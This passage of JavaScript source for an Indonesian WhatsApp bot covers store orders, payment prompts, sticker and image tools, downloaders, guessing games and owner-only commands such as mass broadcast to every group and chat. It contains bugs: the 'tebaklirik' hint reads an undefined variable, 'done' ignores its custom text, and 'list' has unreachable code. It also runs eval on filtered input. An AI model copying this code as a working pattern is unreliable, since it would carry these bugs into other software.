*Harga* : Rp. ${Number(i.price * 1.03).toLocaleString("id")}
*Status* : ${i.status}
*Note* : ${i.note}\n\n`;
					}
					return m.reply(_text);
				}
				break;
			}
			case "trx": { // @tag: store
			// @tag: store
				if (!isOwner) {
					return m.reply(mess.owner);
				}
				if (!args[0] || !args[1]) {
					return m.reply(`Example: *${prefix + command}* PRODUCT NO_TUJUAN`);
				}
				const TRX = await ampangPedia.prepaid.order(args[0], args[1]);
				console.log(TRX);
				const { data } = TRX;
				if (TRX.result && data !== null) {
					m.reply(`_Transaksi status *${data.status}*_

*TRXID* : ${data.trxid}
*Order Id* : ${data.data}
*Item Id* : ${data.service}
*Note*: ${data.note}

*_${TRX.message}_*`);
				} else {
					return m.reply(TRX.message);
				}
				const _status = await ampangPedia.watch(data.trxid);
				if (_status.result) {
					const { data } = _status;
					const _data = data[0];
					m.reply(`_Transaksi status *${_data.status}*_

*TRXID* : ${_data.trxid}
*Order Id* : ${_data.data}
*Item Id* : ${_data.service}
*Note* : ${_data.note}`);
				}
				console.log(_status);
				break;
			}
			case "status": { // @tag: store
				if (!isOwner) {
					return m.reply(mess.owner);
				}
				if (!args[0]) {
					return m.reply(`Example: *${prefix + command}* TRXID`);
				}
				const _status = await ampangPedia.watch(args[0]);
				if (_status.result) {
					const { data } = _status;
					// use let
					let _data = data[0];
					console.log(_data)
					m.reply(`_Transaksi status *${_data.status}*_

TRXID: ${_data.trxid}
orderID: ${_data.data}
itemID: ${_data.service}`);
				}
				break;
			}
			case "myduit": { // @tag: store
				if (!isOwner) {
					return m.reply(mess.owner);
				}
				const myduit = await ampangPedia.profile();
				console.log(myduit);
				let _text = "";
				Object.keys(myduit.data).forEach((key) => {
					_text += `${key}: ${myduit.data[key]}\n`;
				})
				m.reply(_text)
				break
			}
		    case "payment":
			case "qris":
			case "pay": { // @tag: store
				conn.sendMessage(
					m.chat,
					{
						image: {
							url: Config.qris
						},
						fileLength: 9999999,
						caption: Config.caption_pay,
					},
					{
						quoted: m,
					}
				);
			}
			break;
			case "proses": { // @tag: store
				// @tag: store
				if (!m.isGroup) {
					return m.reply(mess.group);
				}
				if (!isAdmin) {
					return m.reply(mess.admin);
				}
				if (!m.quoted) {
					return m.reply(`Balas pesannya bung`);
				}
				const _jam = new Date().toLocaleString("id-ID", {
					timeZone: "Asia/Jakarta",
					hour: "2-digit",
					minute: "2-digit",
					hour12: false,
				});
				const _tanggal = new Date().toLocaleString("id-ID", {
					timeZone: "Asia/Jakarta",
					day: "2-digit",
					month: "2-digit",
					year: "numeric",
				});
				let proses = `「 *TRANSAKSI PENDING* 」\n\n\`\`\`📆 TANGGAL : ${_tanggal}\n⌚ JAM     : ${_jam}\n✨ STATUS  : Pending\`\`\`\n\n📝 Catatan :\n${
					m.quoted.text
				}\n\nPesanan @${m.quoted.sender.split("@")[0]} sedang di proses!`;
				if (chat.sProses) {
					proses = chat.sProses
						.replace("@msg", m.quoted.text)
						.replace("user", m.quoted.sender.split("@")[0])
						.replace("@jam", _jam)
						.replace("@tanggal", _tanggal);
				}
				conn.sendMessage(
					m.chat,
					{
						text: proses,
						mentions: [m.quoted.sender],
					},
					{ quoted: m }
				);
				break;
			}
			case "done": { // @tag: store
				// @tag: store
				if (!m.isGroup) {
					return m.reply(mess.group);
				}
				if (!isAdmin) {
					return m.reply(mess.admin);
				}
				if (!m.quoted) {
					return m.reply(`Balas pesannya bung`);
				}
				const _jam = new Date().toLocaleString("id-ID", {
					timeZone: "Asia/Jakarta",
					hour: "2-digit",
					minute: "2-digit",
					hour12: false,
				});
				const _tanggal = new Date().toLocaleString("id-ID", {
					timeZone: "Asia/Jakarta",
					day: "2-digit",
					month: "2-digit",
					year: "numeric",
				});
				let sukses = `「 *TRANSAKSI BERHASIL* 」\n\n\`\`\`📆 TANGGAL : ${_tanggal}\n⌚ JAM     : ${_jam}\n✨ STATUS  : Berhasil\`\`\`\n\nTerimakasih @${
					m.quoted.sender.split("@")[0]
				} Next Order ya🙏`;
				if (chat.sDone) {
					proses = chat.sDone
						.replace("@msg", m.quoted.text)
						.replace("user", m.quoted.sender.split("@")[0])
						.replace("@jam", _jam)
						.replace("@tanggal", _tanggal);
				}
				conn.sendMessage(
					m.chat,
					{
						text: sukses,
						mentions: [m.quoted.sender],
					},
					{ quoted: m }
				);
				break;
			}
			case "setproses": { // @tag: store
				// @tag: store
				if (!m.isGroup) {
					return m.reply(mess.group);
				}
				if (!isAdmin) {
					return m.reply(mess.admin);
				}
				if (args[0] === "reset") {
					chat.sProses = "";
					return m.reply("Sukses reset text proses.");
				}
				if (!args[0] || !text) {
					return m.reply(`Example: *${prefix + command}*
Status pending

jam: @jam
tanggal: @tanggal

catatan: @msg

pesanan @user sedang proses`);
				}
				chat.sProses = text;
				m.reply(`Sukses set text proses!`);
				break;
			}
			case "setdone": { // @tag: store
				// @tag: store
				if (!m.isGroup) {
					return m.reply(mess.group);
				}
				if (!isAdmin) {
					return m.reply(mess.admin);
				}
				if (args[0] === "reset") {
					chat.sDone = "";
					return m.reply("Sukses reset text done.");
				}
				if (!args[0] || !text) {
					return m.reply(`Example: *${prefix + command}*
Transeksi berhasil

jam: @jam
tanggal: @tanggal

catatan: @msg

pesanan @user berhasil`);
				}
				chat.sDone = text;
				m.reply(`Sukses set text done!`);
				break;
			}
			case "list": { // @tag: store
				// @tag: store
				if (!m.isGroup) {
					return m.reply(mess.group);
				}
				if (!Object.keys(chat.listResponse).length > 0) {
					return m.reply(`Belum ada list digroup ini`);
				}
				// kasih gaya
				let _listResponse = "List\n\n";

				let counter = 1;
				const listResponse = [];
				Object.keys(chat.listResponse).forEach((key) => {

					_listResponse += `${counter}. ${key}\n`

					listResponse.push({
						title: font(key, "a"),
						rowId: prefix + key,
					});

					counter += 1
				});
				return await conn.sendMessage(m.chat, {
					text: _listResponse
				}, { quoted: m });

				conn.sendMessage(
					m.chat,
					{
						text: `Hai @${m.sender.replace(/[^0-9]/g, "")}`,
						footer: `List from ${groupName}`,
						mentions: [m.sender],
						Text: "Click Here!",
						sections: [
							{
								title: groupName,
								rows: listResponse,
							},
						],
					},
					{ quoted: m }
				);
				break;
			}
			case "addlist": { // @tag: store
				// @tag: store
				if (!m.isGroup) {
					return m.reply(mess.group);
				}
				if (!isAdmin) {
					return m.reply(mess.admin);
				}
				const Example = `Example: *${
					prefix + command
				}* key|response\n\nnerd: *${prefix + command}* hen|tai`;
				if (!text) {
					return m.reply(Example);
				}
				const [text_1, ...text_2] = text.split("|");
				if (!text_1 || !(Array.isArray(text_2) && text_2.length)) {
					return m.reply(Example);
				}
				const q = m.quoted ? m.quoted : m;
				const mime = (q.msg || q).mtype || q.type || "";
				let image = false;
				if (/image/i.test(mime)) {
					const _image = await q.download?.();
					image = await uploadImage(_image);
				}
				Object.assign(chat.listResponse, {
					[text_1]: {
						response: text_2.join(" "),
						image: image,
					},
				});
				m.reply(`Sukses menambah list, dengan key ${text_1}`);
				break;
			}
			case "dellist": { // @tag: store
				// @tag: store
				if (!m.isGroup) {
					return m.reply(mess.group);
				}
				if (!isAdmin) {
					return m.reply(mess.admin);
				}
				if (!Object.keys(chat.listResponse).length > 0) {
					return m.reply(`Belum ada list digroup ini`);
				}
				const Example = `Example: *${prefix + command}* key`;
				if (!text) {
					return m.reply(Example);
				}
				if (typeof chat.listResponse[text] !== "object") {
					return m.reply(`tidak ada key *${text}*`);
				}
				Object.keys(chat.listResponse).forEach((key) => {
					if (text === key) {
						delete chat.listResponse[key];
					}
				});
				m.reply(`Sukses menghapus list, dengan key ${text}`);
				break;
			}
			case "tts":
			case "say":
			case "bilang": { // @tag: maker
				// @tag: maker
				if (!text) return m.reply(`Kirim perintah ${prefix + command} teks`);
				m.reply(mess.wait);
				conn.sendMessage( m.chat, {
					audio: {
						url: `https://saipulanuar.ga/api/text-to-audio/tts?text=${text}&idbahasa=id`
					},
					mimetype: "audio/mpeg",
					ptt: true
				}, { quoted: m } );
				consumeLimit();
				break;
			}
			case "animedif": { // @tag: maker
				// @tag: maker
				if (isLimit) {
					return m.reply(mess.limit);
				}
				if (!text) {
					return m.reply(`Example: *${prefix + command}* lovely girl`);
				}
				m.reply(mess.wait);
				await conn.sendMessage(
					m.chat,
					{
						image: {
							url: API(
								"rose",
								"/image/anime/diffusion",
								{
									prompt: text,
								},
								"apikey"
							),
						},
						caption: font(`Prompt: ${text}`, "a"),
					},
					{ quoted: m }
				);
				consumeLimit();
				break;
			}
			case "stabledif": { // @tag: maker
				// @tag: maker
				if (isLimit) {
					return m.reply(mess.limit);
				}
				if (!text) {
					return m.reply(`Example: *${prefix + command}* lovely girl`);
				}
				m.reply(mess.wait);
				await conn.sendMessage(
					m.chat,
					{
						image: {
							url: API(
								"rose",
								"/image/stable/diffusion",
								{
									prompt: text,
								},
								"apikey"
							),
						},
						caption: font(`Prompt: ${text}`, "a"),
					},
					{ quoted: m }
				);
				consumeLimit();
				break;
			}
			case "jadianime":
			case "jadiwibu": { // @tag: maker
				// @tag: maker
				if (isLimit) {
					return m.reply(mess.limit);
				}
				const q = m.quoted ? m.quoted : m;
				const mime = (q.msg || q).mtype || q.type || "";
				if (/image/i.test(mime)) {
					m.reply(mess.wait);
					let image = await q.download?.();
					image = await uploadImage(image);
					await conn.sendMessage(
						m.chat,
						{
							image: {
								url: API(
									"rose",
									"/image/differentMe",
									{
										url: image,
									},
									"apikey"
								),
							},
							caption: font("Done!", "g"),
						},
						{ quoted: m }
					);
					consumeLimit();
				} else {
					m.reply(`Reply/kirim gambar dengan caption *${prefix + command}*`);
				}
				break;
			}
			case "remini": { // @tag: maker
				// @tag: maker
				if (isLimit) {
					return m.reply(mess.limit);
				}
				const q = m.quoted ? m.quoted : m;
				const mime = (q.msg || q).mtype || q.type || "";
				if (/image/i.test(mime)) {
					m.reply(mess.wait);
					let image = await q.download?.();
					image = await uploadImage(image);
					await conn.sendMessage(
						m.chat,
						{
							image: {
								url: API(
									"rose",
									"/image/unblur",
									{
										url: image,
									},
									"apikey"
								),
							},
							caption: font("Done!", "g"),
						},
						{ quoted: m }
					);
					consumeLimit();
				} else {
					m.reply(`Reply/kirim gambar dengan caption *${prefix + command}*`);
				}
				break;
			}
			case "upload":
			case "tourl": { // @tag: tools
				// @tag: tools
				if (isLimit) {
					return m.reply(mess.limit);
				}
				const q = m.quoted ? m.quoted : m;
				const mime = (q.msg || q).mtype || q.type || "";
				if (/image/i.test(mime)) {
					let image = await q.download?.();
					image = await uploadImage(image);
					await conn.sendMessage(m.chat, { text: image }, { quoted: m });
					consumeLimit();
				} else {
					m.reply(`Reply/kirim gambar dengan caption *${prefix + command}*`);
				}
				break;
			}
			case "sticker":
			case "s":
			case "stiker": { // @tag: maker
				// @tag: maker
				if (isLimit) {
					return m.reply(mess.limit);
				}
				const q = m.quoted ? m.quoted : m;
				const mime = (q.msg || q).mtype || q.type || "";
				if (/image|video/i.test(mime)) {
					const image = await q.download?.();
					let sticker;
					if (/video/i.test(mime)) {
						if ((q.msg || q).seconds > 11) {
							return m.reply("Max 10 detik dek");
						}
						sticker = await writeExifVid(image, {
							packname: Config.sticker.packname,
							author: Config.sticker.author,
						});
					} else {
						sticker = await writeExifImg(image, {
							packname: Config.sticker.packname,
							author: Config.sticker.author,
						});
					}
					await conn.sendMessage(
						m.chat,
						{
							sticker: {
								url: sticker,
							},
						},
						{ quoted: m }
					);
					consumeLimit();
				} else {
					m.reply(
						`Reply/kirim video/gambar dengan caption *${prefix + command}*`
					);
				}
				break;
			}
			case "attp": { // @tag: maker
				// @tag: maker
				if (isLimit) {
					return m.reply(mess.limit);
				}
				if (!text) {
					return m.reply(`Example: *${prefix + command}* david gans`);
				}
				const image = await (
					await fetch(
						API(
							"rose",
							"/others/attp",
							{
								text,
							},
							"apikey"
						)
					)
				).buffer();
				const sticker = await writeExifVid(image, {
					packname: Config.sticker.packname,
					author: Config.sticker.author,
				});
				await conn.sendMessage(
					m.chat,
					{
						sticker: {
							url: sticker,
						},
					},
					{ quoted: m }
				);
				consumeLimit();
				break;
			}
			case "ttp": { // @tag: maker
				// @tag: maker
				if (isLimit) {
					return m.reply(mess.limit);
				}
				if (!text) {
					return m.reply(`Example: *${prefix + command}* david gans`);
				}
				const image = await (
					await fetch(
						API(
							"rose",
							"/others/ttp",
							{
								text,
							},
							"apikey"
						)
					)
				).buffer();
				const sticker = await writeExifImg(image, {
					packname: Config.sticker.packname,
					author: Config.sticker.author,
				});
				await conn.sendMessage(
					m.chat,
					{
						sticker: {
							url: sticker,
						},
					},
					{ quoted: m }
				);
				consumeLimit();
				break;
			}
			case "chatgpt": { // @tag: tools
				// @tag: tools
				if (isLimit) {
					return m.reply(mess.limit);
				}
				if (!text) {
					return m.reply(`Example: *${prefix + command}* apa itu gay`);
				}
				const json = await (
					await fetch(
						API(
							"rose",
							"/chatGPT/completions",
							{
								prompt: text,
							},
							"apikey"
						)
					)
				).json();
				if (!json.status) {
					return m.reply(json.message || "Error: server overload");
				}
				await conn.sendMessage(
					m.chat,
					{
						text: json.message,
					},
					{ quoted: m }
				);
				consumeLimit();
				break;
			}
			case "instagram": { // @tag: downloader
				// @tag: downloader
				if (isLimit) {
					return m.reply(mess.limit);
				}
				if (!args[0]) {
					return m.reply(`Example: *${prefix + command}* link_post_ig`);
				}
				m.reply(mess.wait);
				const json = await (
					await fetch(
						API(
							"rose",
							"/downloader/ig",
							{
								url: args[0],
							},
							"apikey"
						)
					)
				).json();
				if (!json.status) {
					return m.reply(json.message || "Error: server overload");
				}
				if (Array.isArray(json.result) && json.result.length) {
					for await (const i of json.result) {
						const { headers } = await axios
							.head(i.url)
							.catch((e) => (e === null || e === void 0 ? void 0 : e.response));
						if (
							headers &&
							headers["content-type"] &&
							headers["content-type"].includes("image")
						) {
							await conn.sendMessage(
								m.chat,
								{
									image: {
										url: i.url,
									},
								},
								{ quoted: m }
							);
						}
						if (
							headers &&
							headers["content-type"] &&
							headers["content-type"].includes("video")
						) {
							await conn.sendMessage(
								m.chat,
								{
									video: {
										url: i.url,
									},
								},
								{ quoted: m }
							);
						}
					}
				}
				consumeLimit();
				break;
			}
			case "storyanime": { // @tag: random
				// @tag: random
				if (isLimit) {
					return m.reply(mess.limit);
				}
				m.reply(mess.wait);
				await conn.sendMessage(
					m.chat,
					{
						video: {
							url: API("rose", "/random/story/anime", {}, "apikey"),
						},
						caption: font("random video anime", "a"),
					},
					{ quoted: m }
				);
				consumeLimit();
				break;
			}
			case "quoteswibu": { // @tag: random
				// @tag: random
				if (isLimit) {
					return m.reply(mess.limit);
				}

				const json = await (
					await fetch(
						API(
							"rose",
							"/anime/quotes",
							{
								url: args[0],
							},
							"apikey"
						)
					)
				).json();
				if (!json.status) {
					return m.reply(json.message || "Error: admin cbl");
				}
				await conn.sendMessage(
					m.chat,
					{
						text: font(
							`${json.quote}

- ${json.anime} -`,
							"e"
						),
						footer: font(json.character, "a"),
						buttons: [
							{
								buttonId: "none",
								buttonText: { displayText: font("OK", "g") },
								type: 1,
							},
						],
					},
					{ quoted: m }
				);
				consumeLimit();
				break;
			}
			case "owner": { // @tag: info
				// @tag: info
				conn.sendContact(m.chat, Config.owner, m);
				break;
			}
			case "setprofilebot": { // @tag: owner
				// @tag: owner
				if (!isOwner) {
					return m.reply(mess.owner);
				}
				const q = m.quoted ? m.quoted : m;
				const mime = (q.msg || q).mtype || q.type || "";
				if (!/image/i.test(mime)) {
					return m.reply(
						`reply/kirim gambar dengan caption *${prefix + command}*`
					);
				}
				const image = await q.download?.();
				await conn.updateProfilePicture(conn.user.jid, image);
				m.reply("_sukses_");
				break;
			}
			case "smeme": { // @tag: maker
				// @tag: maker
				if (isLimit) {
					return m.reply(mess.limit);
				}
				const q = m.quoted ? m.quoted : m;
				const mime = (q.msg || q).mtype || q.type || "";
				if (!/image/i.test(mime)) {
					return m.reply(
						`reply/kirim gambar dengan caption *${prefix + command}* atas|bawah`
					);
				}
				const [text_1, ...text_2] = text.split("|");
				if (!text_1 || !text_2) {
					return m.reply(`Example: *${prefix + command}* anjay|gg`);
				}
				m.reply(mess.wait);
				let image = await q.download?.();
				image = await uploadImage(image);
				let sticker = await (
					await fetch(
						`https://api.memegen.link/images/custom/${encodeURIComponent(
							text_1 ? text_1 : ""
						)}/${encodeURIComponent(
							text_2 ? text_2 : ""
						)}.png?background=${image}`
					)
				).buffer();
				sticker = await writeExifImg(sticker, {
					packname: Config.sticker.packname,
					author: Config.sticker.author,
				});
				await conn.sendMessage(
					m.chat,
					{
						sticker: {
							url: sticker,
						},
					},
					{ quoted: m }
				);
				consumeLimit();
				break;
			}
			case "sendsc": {
				if (!isOwner) {
					return m.reply(mess.owner)
				}
				const ls = (await execSync("ls"))
				.toString()
				.split("\n")
				.filter(
					(key) =>
						key !== "node_modules" &&
						key !== "package-lock.json" &&
						key !== "session" &&
						key !== "database.json" &&
						key !== "yarn.lock" &&
						key !== "yarn-error.log" &&
						key !== "bak" &&
						key !== ""
				)
				const fileName = `Miaw_${Date.now()}_.zip`
				await execSync(`zip -r ${fileName} ${ls.join(" ")}`);
				await conn.sendMessage(
					((m.isGroup && args[0] !== "force") ? m.sender : m.chat),
					{
						document: await fs.readFileSync(fileName),
						mimetype: "application/zip",
						fileName,
					},
					{ quoted: m }
				);
				fs.unlinkSync(fileName)
				break
			}
			case "cheat-duit": {
				if (!isOwner) {
					return
				}
				user.money = user.money + 99999
				m.reply("Cheat active")
				break
			}
			case "listgroup": { // @tag: owner
				if (!isOwner) {
					return m.reply(mess.owner)
				}
				const listGroups = await conn.groupFetchAllParticipating();
				let _text = font("List Groups\n\n", "g");
				Object.keys(listGroups).forEach((key) => {
					_text += `${font("name", "a")} : ${listGroups[key].subject}\n${font("jid", "a")} : ${listGroups[key].id}\n\n`
				});
				await conn.sendMessage(m.chat, {
					text: _text,
				}, { quoted: m })
				break
			}
			case "bcgc": { // @tag: owner
				if (!isOwner) {
					return m.reply(mess.owner)
				}
				if (!text) {
					return m.reply(`Text nya mana dek?`)
				}
				const q = m.quoted ? m.quoted : m;
				const mime = (q.msg || q).mtype || q.type || "";
				let image = false
				let audio = false
				let video = false
				if (/image|audio|video/i.test(mime)) {
					if (/image/i.test(mime)) {
						image = await q.download?.();
					} else if (/audio/i.test(mime)) {
						audio = await q.download?.();
					} else if (/video/i.test(mime)) {
						video = await q.download?.();
					}
				}
				const listGroups = await conn.groupFetchAllParticipating();
				m.reply(`Mengirim broadcast ke ${Object.keys(listGroups).length} groups`)
				await delay(3 * 1000);
				let prepare = { text }
				if (image) {
					prepare = { image, caption: text }
				} else if (audio) {
					prepare = { audio, caption: text, mimetype: "audio/mp4" }
				} else if (video) {
					prepare = { video, caption: text }
				}
				Object.assign(prepare, {
					[(image || video || audio) ? "caption" : "text"]: prepare[(image || video || audio) ? "caption" : "text"] + font("\n\n[ All Groups Broadcast ]", "a")
				})
				Object.keys(listGroups).forEach(async(key) => {
					if (!(listGroups[key].restrict && listGroups[key].restrict)) {
						const _msg = await conn.sendMessage(key, { ...prepare, contextInfo: { forwardingScore: 1, isForwarded: true } })
						if (audio) {
							await conn.sendMessage(key, { text: prepare["caption"] }, { quoted: _msg })
						}
						await delay(2 * 1000)
					}
				});
				m.reply("selesai Broadcast all groups");
				break
			}
			case "bc": { // @tag: owner
				if (!isOwner) {
					return m.reply(mess.owner)
				};
				if (!text) {
					return m.reply(`Text nya mana dek?`)
				}
				const q = m.quoted ? m.quoted : m;
				const mime = (q.msg || q).mtype || q.type || "";
				let image = false
				let audio = false
				let video = false
				if (/image|audio|video/i.test(mime)) {
					if (/image/i.test(mime)) {
						image = await q.download?.();
					} else if (/audio/i.test(mime)) {
						audio = await q.download?.();
					} else if (/video/i.test(mime)) {
						video = await q.download?.();
					}
				}
				const listChats = store.chats["array"].filter((key) => key.id.endsWith(".net")).map((v) => v["id"])
				m.reply(`Mengirim broadcast ke ${listChats.length} chat`)
				await delay(3 * 1000);
				let prepare = { text }
				if (image) {
					prepare = { image, caption: text }
				} else if (audio) {
					prepare = { audio, caption: text, mimetype: "audio/mp4" }
				} else if (video) {
					prepare = { video, caption: text }
				}
				Object.assign(prepare, {
					[(image || video || audio) ? "caption" : "text"]: prepare[(image || video || audio) ? "caption" : "text"] + font("\n\n[ All Chats Broadcast ]", "a")
				})
				listChats.forEach(async(key) => {
					const _msg = await conn.sendMessage(key, { ...prepare, contextInfo: { forwardingScore: 1, isForwarded: true } })
					if (audio) {
						await conn.sendMessage(key, { text: prepare["caption"] }, { quoted: _msg })
					}
					await delay(2 * 1000)
				});
				m.reply("selesai Broadcast all chats");
				break
			}
			case "totalchats": { // @tag: info
				const listChats = store.chats["array"].filter((key) => key.id.endsWith(".net")).map((v) => v["id"])
				m.reply(`Total: ${listChats.length} chat`)
				break
			}
			case "join": { // @tag: owner
				if (!isOwner) {
					return m.reply(mess.owner)
				}
				if (!args[0]) {
					return m.reply(`Example: *${prefix + command}* link_gc`)
				}
				const linkRegex = /chat.whatsapp.com\/([0-9A-Za-z]{20,24})( [0-9]{1,3})?/i;
				let [_, code] = args[0].match(linkRegex) || [];
				if (!code) {
					return m.reply("Link invalid")
				}
				const Jid = await conn.groupAcceptInvite(code);
				m.reply(`Sukses join group\n\nJid: ${Jid}`)
				break
			}
			case "leave": { // @tag: owner
				if (!isOwner) {
					return m.reply(mess.owner)
				}
				if (text) {
					try {
						await conn.groupLeave(args[0]);
						return m.reply(`Berhasil keluar dari ${args[0]}`)
					} catch (e) {
						m.reply("Sepertinya jid tersebut salah")
					}
				} else {
					if (!m.isGroup) {
						return m.reply(`Example: *${prefix + command}* jid_group`)
					}
					await conn.groupLeave(m.chat);
					return
				}
				break
			}
			case "maintenance": { // @tag: owner
				if (!isOwner) {
					return m.reply(mess.owner)
				}
				if (!args[0]) {
					return m.reply(`Example: *${prefix + command}* on/off`)
				}
				if (args[0] === "on") {
					settings["maintenance"] = true;
					m.reply("maintenance mode aktive")
				}
				if (args[0] === "off") {
					settings["maintenance"] = false;
					m.reply("maintenance mode inactive")
				}
				break
			}
			case "log": {
				if (!isOwner) {
					return
				}
				console.log(m.quoted ? m.quoted.text : m.text);
				break
			}
			case "calculator": { // @tag: tools
				if (isLimit) {
					return m.reply(mess.limit)
				}
				if (!text) {
					return m.reply(`Example: *${prefix + command}* 1*6 dan 6+8

Operator sederhana:
- = kurang.
+ = tambah
/ = bagi
* = kali
`)
				}
				// wkwk
				const calculate = (str) => {
					const prepare = str.replace(/[^ 0-9\+\-\*\/]/g, "").trim().split(" ").filter((v) => v !== "")
					let final = [];
					for (key of prepare) {
						final.push(`${key} = ${eval(key)}`)
					}
					return final.join("\n")
				}
				m.reply(`${calculate(text)}`)
				consumeLimit()
				break
			}
			case "wallpaper": { // @tag: random
				if (isLimit) {
					return m.reply(mess.limit)
				}
				m.reply(mess.wait)
				const isLive = Math.random() > 0.5 ? "image" : "video";
				const opts = isLive === "video" ? { live: true } : {}
				await conn.sendMessage(
					m.chat,
					{
						[isLive]: {
						url: API("rose", "/random/wallpaper/anime", opts, "apikey")
						},
						caption: font(`random ${isLive === "video" ? "live " : ""}wallpaper anime`, "a"),
						footer: Config.footer,
						buttons: [
							{
								buttonId: prefix + command,
								buttonText: { displayText: font("Next", "g") },
								type: 1,
							},
						],
					},
					{ quoted: m }
				);
				consumeLimit()
				break
			}
			case "autoread": { // @tag: owner
				if (!isOwner) {
					return m.reply(mess.owner)
				}
				if (!args[0]) {
					return m.reply(`Example: *${prefix + command}* on/off`)
				}
				const input = args[0].toLowerCase()
				if (input === "on") {
					settings["autoread"] = true;
					return m.reply("autoread enabled")
				}
				if (input === "off") {
					settings["autoread"] = false;
					return m.reply("autoread disabled")
				}
				break
			}
			case "jadian": { // @tag: group
				if (!m.isGroup) {
					return m.reply(mess.group)
				}
				const listing = participants.map((v) => v.id).filter((jid) => jid !== conn.user.jid)
				const you = listing[Math.floor(Math.random() * listing.length)];

				const listExcept = participants.map((v) => v.id).filter((jid) => jid !== you)
				const who = listExcept[Math.floor(Math.random() * listExcept.length)];

				await conn.sendMessage(m.chat, {
					text: `@${you.replace(/[^0-9]/g, "")} ❤️ @${who.replace(/[^0-9]/g, "")}`,
					mentions: [you, who]
				}, { quoted: m } )
				break
			}
			case "paling": { // @tag: group
				if (!m.isGroup) {
					return m.reply(mess.group)
				}
				if (!text) {
					return m.reply(`Example: *${prefix + command}* cantiq`)
				}
				const listing = participants.map((v) => v.id).filter((jid) => jid !== conn.user.jid)
				const who = listing[Math.floor(Math.random() * listing.length)];
				await conn.sendMessage(m.chat, {
					text: font(`yang paling *${text}* disini adalah @${who.replace(/[^0-9]/g, "")}`, "a"),
					mentions: [who]
				}, { quoted: m })
				break
			}
			case "translate": { // @tag: tools
				if (!isPremium) {
					return m.reply(mess.premium)
				}
				const [source, ...resources] = args
				if (!source) {
					return m.reply(`Example: *${prefix + command}* ja apa kabar\n\ntranslate ke jepang`);
				}
				const translateResults = await voicevox.detect_all_language(resources.join(" "), source);
				if (!translateResults) {
					return m.reply(`Failed to translate`)
				}
				await conn.sendMessage(m.chat, {
					text: translateResults,
				}, { quoted: m })
				break
			}
			case "tebaklirik": { // @tag: games
				if (!settings.rpg["enable"]) {
					return m.reply(mess.rpgDisabled);
				}
				if (!isUserRpg) {
					return m.reply(mess.notInRpg);
				}
				if (!m.isGroup) {
					return m.reply(mess.group);
				}
				conn.tebaklirik = conn.tebaklirik ? conn.tebaklirik : {};
				if (m.chat in conn.tebaklirik) {
					return conn.sendMessage(m.chat, {
						text: "Masih ada game yang sedang berlangsung...",
					}, { quoted: conn.tebaklirik[m.chat][0] })
				}
				const tebaklirik = games.tebaklirik[Math.floor(Math.random() * games.tebaklirik.length)]
				const timeout = 120000
				const reward = 1000
				const _text = `Soal: ${tebaklirik.soal}

Timeout: *${(timeout / 1000).toFixed(2)} detik*
Reward: Rp. *${Number(reward).toLocaleString("id")}*

Hint: ${tebakan.jawaban.replace(/[AIUEO]/gi, "_")}`
				conn.tebaklirik[m.chat] = [
					await conn.sendMessage(m.chat, {
						text: _text
					}, { quoted: m }),
					tebaklirik,
					reward,
					setTimeout(async () => {
						await conn.sendMessage(m.chat, {
							text: font(`Waktu habis`, "g")
						}, { quoted: conn.tebaklirik[m.chat][0] })
						delete conn.tebaklirik[m.chat];
					}, timeout)
				]
				break
			}
			case "tebakan": { // @tag: games
				if (!settings.rpg["enable"]) {
					return m.reply(mess.rpgDisabled);
				}
				if (!isUserRpg) {
					return m.reply(mess.notInRpg);
				}
				if (!m.isGroup) {
					return m.reply(mess.group);
				}
				conn.tebakan = conn.tebakan ? conn.tebakan : {};
				if (m.chat in conn.tebakan) {
					return conn.sendMessage(m.chat, {
						text: "Masih ada game yang sedang berlangsung...",
					}, { quoted: conn.tebakan[m.chat][0] })
				}
				const tebakan = games.tebakan[Math.floor(Math.random() * games.tebakan.length)]
				const timeout = 120000
				const reward = 1000
				const _text = `Soal: ${tebakan.soal}

Timeout: *${(timeout / 1000).toFixed(2)} detik*
Reward: Rp. *${Number(reward).toLocaleString("id")}*

Hint: ${tebakan.jawaban.replace(/[AIUEO]/gi, "_")}`
				conn.tebakan[m.chat] = [
					await conn.sendMessage(m.chat, {
						text: _text
					}, { quoted: m }),
					tebakan,
					reward,
					setTimeout(async () => {
						await conn.sendMessage(m.chat, {
							text: font(`Waktu habis`, "g")
						}, { quoted: conn.tebakan[m.chat][0] })
						delete conn.tebakan[m.chat];
					}, timeout)
				]
				break
			}
			case "tebakkata": { // @tag: games
				if (!settings.rpg["enable"]) {
					return m.reply(mess.rpgDisabled);
				}
				if (!isUserRpg) {
					return m.reply(mess.notInRpg);
				}
				if (!m.isGroup) {
					return m.reply(mess.group);
				}
				conn.tebakkata = conn.tebakkata ? conn.tebakkata : {};
				if (m.chat in conn.tebakkata) {
					return conn.sendMessage(m.chat, {
						text: "Masih ada game yang sedang berlangsung...",
					}, { quoted: conn.tebakkata[m.chat][0] })
				}
				const tebakkata = games.tebakkata[Math.floor(Math.random() * games.tebakkata.length)]
				const timeout = 120000
				const reward = 1000
				const _text = `Soal: ${tebakkata.soal}

Timeout: *${(timeout / 1000).toFixed(2)} detik*
Reward: Rp. *${Number(reward).toLocaleString("id")}*

Hint: ${tebakkata.jawaban.replace(/[AIUEO]/gi, "_")}`
				conn.tebakkata[m.chat] = [
					await conn.sendMessage(m.chat, {
						text: _text
					}, { quoted: m }),
					tebakkata,
					reward,
					setTimeout(async () => {
						await conn.sendMessage(m.chat, {
							text: font(`Waktu habis`, "g")
						}, { quoted: conn.tebakkata[m.chat][0] })
						delete conn.tebakkata[m.chat];
					}, timeout)
				]
				break
			}
			case "asahotak": { // @tag: games
				if (!settings.rpg["enable"]) {
					return m.reply(mess.rpgDisabled);
				}
				if (!isUserRpg) {
					return m.reply(mess.notInRpg);
				}
				if (!m.isGroup) {
					return m.reply(mess.group);
				}
				conn.asahotak = conn.asahotak ? conn.asahotak : {};
				if (m.chat in conn.asahotak) {
					return conn.sendMessage(m.chat, {
						text: "Masih ada game yang sedang berlangsung...",
					}, { quoted: conn.asahotak[m.chat][0] })
				}
				const asahotak = games.asahotak[Math.floor(Math.random() * games.asahotak.length)]
				const timeout = 120000
				const reward = 1000
				const _text = `Soal: ${asahotak.soal}

Timeout: *${(timeout / 1000).toFixed(2)} detik*
Reward: Rp. *${Number(reward).toLocaleString("id")}*

Hint: ${asahotak.jawaban.replace(/[AIUEO]/gi, "_")}`
				conn.asahotak[m.chat] = [
					await conn.sendMessage(m.chat, {
						text: _text
					}, { quoted: m }),
					asahotak,
					reward,
					setTimeout(async () => {
						await conn.sendMessage(m.chat, {
							text: font(`Waktu habis`, "g")
						}, { quoted: conn.asahotak[m.chat][0] })
